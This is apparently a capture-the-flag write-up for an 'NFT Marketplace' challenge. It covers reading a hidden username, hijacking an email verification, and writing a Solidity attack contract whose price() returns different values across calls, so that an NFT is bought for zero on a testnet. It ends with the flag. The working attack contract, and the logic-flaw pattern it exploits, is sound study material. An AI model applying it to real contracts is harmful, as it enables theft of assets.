<img src="https://miro.medium.com/max/630/1*x0pAvH_cWU8VaBmxAe7T7w.png">

## Exploration
In the first step, click the login button and look at the ```source code``` on the login page. Then find the username as **wasny** in the comment code.

```html
<form name="sign-form" id='sign-form' class="form-border" method="post">
   <div class="field-set">
    <input type='text' name='username' id='username' class="form-control" placeholder="username">
  </div>
<div class="field-set">
  <input type='password' name='password' id='password' class="form-control" placeholder="password">
</div>
<!-- Catch Up wasny -->
<div class="field-set">
  <input type='submit' id='login' value='Log In' class="btn btn-main btn-fullwidth color-2">
</div>
 <div class="clearfix"></div>
   <div class="spacer-single"></div>
 </form>
```
When we looking at cokkies, there is cokkie named **guest** as hash and it was encoded with Base64. Decode it in Cyber Chef
<img src="https://miro.medium.com/max/630/1*knilbiqdlBXeOKbRIvlPGg.png">

Result is JSON format.

<img src="https://github.com/wasny0ps/TIMTAL-CTF-Writeups/blob/main/2022/NFT%20Marketplace/img/cyberchef.png">

Listen the network with BurpSuite and log in. Authentication page welcome us.

<img src="https://miro.medium.com/max/382/1*mDORSfR8Zd5hvCMHYVi1Bw.png">

Check network and find **wasny1234@gmail.com** which is wasny's email address.
<img src="https://miro.medium.com/max/630/1*M-O6ba1VgJN6DWwyRUvZdQ.png">

You must change this email address with your email address in inspector section and clicked the ```Send Again``` button.Enter the code sent to you.

<img src="https://miro.medium.com/max/379/1*NHxwaC-Elc4jpLoK5Y9acA.png">
<img src="https://miro.medium.com/max/396/1*MAGlDVeREElj0F4A-EH6Lw.png">

If you have received this message, you must set MetaMask in your browser. https://metamask.io/
<img src="https://miro.medium.com/max/436/1*Im5ugHGBxJwyHWZgu-Zhew.png">

Now, we are in **profile.php** so we must connect to MetaMask wallet in ```Connect Wallet``` button.
<img src="https://miro.medium.com/max/630/1*B_Dys9i-qAK_yDU9Vsf0ow.png">

Click on the continue button in notification which came from the MetaMask plugin and connect the wallet.
<img src="https://miro.medium.com/max/324/1*iSGZL5xkYdboGBayYxPp-g.png">
<img src="https://miro.medium.com/max/324/1*HMWfoUzhJgXDNYCxZyoxTA.png">
<img src="https://miro.medium.com/max/432/1*H_3cNehv_zVhidqJyZhaOw.png">

As you can see, there is an NFT named My Favorite Item at the bottom left and it had added to the wishlist in profile.php.
When I clicked the buy button, the website directed me to **item.php** page.
<img src="https://miro.medium.com/max/630/1*KQ-EKhtkQMBLv-OVqFQ4dg.png">

After this stage, switch to Rinkeby Test Network.

<img src="https://miro.medium.com/max/309/1*Kcpuegw5u2UoUlDV-XjAOw.png">

When click the Buy Now button, this notification met us.

<img src="https://miro.medium.com/max/300/1*MQBFWKs3WfVFjU4hjr6D6g.png">

As you understood from this notification, we can’t afford it. At this moment, the creative side of the challenge has begun.If you can’t afford something and have to buy it, you have two options. The first alternative is to steal that product; The second choice is to bring the product to a size you can afford. We will apply the second option. In other words, we will buy lower the price of the selected NFT.

Primarily, we need to get free test eth at https://faucets.chain.link/rinkeby to use on rinkby testnet to our wallet. (For the test eth network, sites such as https://rinkebyfaucet.com/ or https://faucet.rinkeby.io/ can be preferred.)

Blockchain technologies are used in all purchases on Web3 sensitive sites. In this case, all purchases are recorded and controlled in the smart contracts within the blockchain system. In this challenge, NFT is controlled by a smart contract as we will be making a purchase. Based on this information, the first thing to do is to find the contract address of this NFT.Looking at the scripts of the page, an object named “web3” was created using the **Web3** library, unlike other js.

```js
<script type="text/javascript">
            window.onload=check();

            function check(argument) {


                /*// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}*/

var contract;
web3 = new Web3(web3.currentProvider);

var address="0xd9145CCE52D386f254917e481eB44e9943F39138";
var abi=[
{
    "inputs": [],
    "name": "buy",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
},
{
    "inputs": [],
    "name": "isSold",
    "outputs": [
    {
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }
    ],
    "stateMutability": "view",
    "type": "function"
},
{
    "inputs": [],
    "name": "price",
    "outputs": [
    {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }
    ],
    "stateMutability": "view",
    "type": "function"
}
];


contract= new web3.eth.Contract(abi,address);
contract.methods.price().call().then(function (price) {
    $("#price").html(price+" ETH");
    contract.methods.isSold().call().then(function (answer) {
        if (answer==true) 
        {
                        window.open("https://siberguvenliklisesi.com/timtalmarketplace/avatar.php","_self");
        }
    })
})
}



function buy() {

    var contract;
    web3 = new Web3(web3.currentProvider);

    var address="0xd9145CCE52D386f254917e481eB44e9943F39138";
    var abi=[
    {
        "inputs": [],
        "name": "buy",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "isSold",
        "outputs": [
        {
            "internalType": "bool",
            "name": "",
            "type": "bool"
        }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "price",
        "outputs": [
        {
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
        }
        ],
        "stateMutability": "view",
        "type": "function"
    }
    ];


    contract= new web3.eth.Contract(abi,address);

    web3.eth.getAccounts().then(function(accounts){
        var acc = accounts[0];
        return contract.methods.buy().send({from: acc});
    })
}
</script>
```
This script clearly shows that we have a contract which address is **_0xbc9AdC8Dd14e89BE085f76a62F289cEb97D9f937_**. Apart from that, another clue as substantial as the contract address is the contract’s ABI.
ABI (Application Binary Interface) in the context of computer science is an interface between two program modules, often between operating systems and user programs. More about ABI.
The smart contract(solidity) codes added as a comment line to the source part of the page also confirm the information in the ABI.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```
To Explain the code shortly, the expression pragma solidity ^0.6.0 indicates that this contract will be compilable in versions **0.6.0 and higher**.
Afterwards, we have an interface whose name is Buyer and it controls the price variable, which is public at the same time its value is 100. And we have a shop contract and there is a public bool variable called **isSold**, it checks the status of the item. Subsequently, an object named _buyer belonging to the **_Buyer_** interface is defined. Finally, there is if control. If the quantity sent to the contract for the NFT is greater than or equal to the specified price and the item is not sold, the **isSold** variable is set to true and the price variable is equal to the sent quantity.

If look carefully, you can see that if the **isSolid** variable’s value comes true, website directed us **avatar.php** page.

```solidity
contract= new web3.eth.Contract(abi,address);
contract.methods.price().call().then(function (price) {
    $("#price").html(price+" ETH");
    contract.methods.isSold().call().then(function (answer) {
        if (answer==true) 
        {
                        window.open("https://siberguvenliklisesi.com/timtalmarketplace/avatar.php","_self");
        }
    })
})
```
Now we know what to do. We have to change the value of isSold variable to true and manipulate the price of NFT. But how?
In the contract, the Buyer interface is called two times. In the first call, we will use for a bypass this requirement. In the second call, we will decrease the price which we can afford it.
Let’s transfer this code to EVM(Ethereum Virtual Machine) to use in attack code. 

Firstly, we must import **shop.sol** in attacker file. Next, when we create the attack contract, we should use is parameter for inherit ```Buyer``` interface.Next, we defined an object named shop that can access functions and variables in **Shop** contract.Thereafter, we need to specify the target contract address beforehand in order for the attack contract to be called in future transactions. So should be use ```constructor``` expression.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Shop.sol';

contract AttackShop is Buyer{
    Shop public shop;

    constructor(Shop _shop) public{
        shop= _shop;
    }

    function buy() public{
        shop.buy();
    }

    function price() public view override returns(uint){
        return shop.isSold() ? 0:100;
    }
}
```
buy() function calls buy() function which is in target code in another words click the **_Buy Now_** button.

In the **price** function, where the magic begins, it is public and view. Hereby, it can interact with the target contract. Also, **override** specifically refers to inside the Buyer interface because interfaces are open to external calls. The important point is in the interface there is a price function. Furthermore, it is open to external calls too. In short, it is a **virtual(editable)** function and override helps us to re-write this function. 

In the return part, there is a kind of logic calculation thats why basically we’re going to bring some things **back**.The critical part is there are ```ternary operators```. 
Ternary operators get used like this.
> conditional ? if-true : if-false

In this challenge, conditional says if ```isSold``` equals **true**, then return **0** which is our aim to decrease the prize.If isSold equals **false**, it should return **100**. In this way, we can pass the first condition. Actually when amount was sent by attack contract, it is inadequate therefore it will return false from and attack contract **return 100** later it will call first time.Since it detects the amount sent as 100 and the isSold variable is false, it will have met the if condition . After passed the if part, buyer function call **again**.In this case, isSold variable is **true** and the price will return **0** and then NFT’s price will equals to zero.

Let’s compile and deploy **_Shop_Attack.sol_** after connect the **MetaMask wallet**. It is important.

<img src="https://miro.medium.com/max/630/1*w-GcCHRnsyoH7ZddQe-Jow.png">

Copy the target contract address which is **0xbc9AdC8Dd14e89BE085f76a62F289cEb97D9f937** and paste into constructor.

<img src="https://miro.medium.com/max/300/1*z3vYE2_N9YzGb6i7XVAwOg.png">

Please confirmed it.

<img src="https://miro.medium.com/max/300/1*Btxn8g9vlMIOmXNjqETPCw.png">

<imh src="https://miro.medium.com/max/300/1*Lg9ELM3MVPEvgHWVZpv6Jw.png">

Let’s click the buy button,confirm it.

<img src="https://miro.medium.com/max/300/1*p9zorr689FCxzD-3RATzCQ.png">

Result:

<img src="https://miro.medium.com/max/300/1*bIPltGvlM2OTHBLkQh9leA.png">

We have bought this NFT just free!

When refresh the item.php page, it is automatically directed me avatar.php and download our NFT..

<img src="https://miro.medium.com/max/630/1*xzvXGrtjmaUdwQJMb6oC1w.png">
<img src="https://miro.medium.com/max/630/1*qVED5n5vlUfzzv-br99R1A.png">

It gave me a pdf. Let’s look at the metadata of pdf.
```powershell
┌──(kali㉿kali)-[~/Pictures]
└─$ ls
𐱅𐰼𐰇𐰰.pdf
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Pictures]
└─$ exiftool 𐱅𐰼𐰇𐰰.pdf 
ExifTool Version Number         : 12.41
File Name                       : 𐱅𐰼𐰇𐰰.pdf
Directory                       : .
File Size                       : 604 KiB
File Modification Date/Time     : 2022:08:26 18:41:53-04:00
File Access Date/Time           : 2022:08:26 18:42:45-04:00
File Inode Change Date/Time     : 2022:08:26 18:42:45-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Hi Exit
Create Date                     : 2022:05:23 00:16:19+02:00
Producer                        : 
Modify Date                     : 2022:05:23 00:16:19+02:00
Keywords                        : RkxBR3tvcHBvcnR1bmlzdF93ZWIzaGFja2VyIX0=
Title                           : 
Subject                         : 
Creator                         : 
```
In the keywords, there is hash encoded with base64. Let’s decode it and get the flag.

<img src="https://github.com/wasny0ps/TIMTAL-CTF-Writeups/blob/main/2022/NFT%20Marketplace/img/flag.png">

> FLAG{opportunist_web3hacker!}

**_by wasny0ps_**
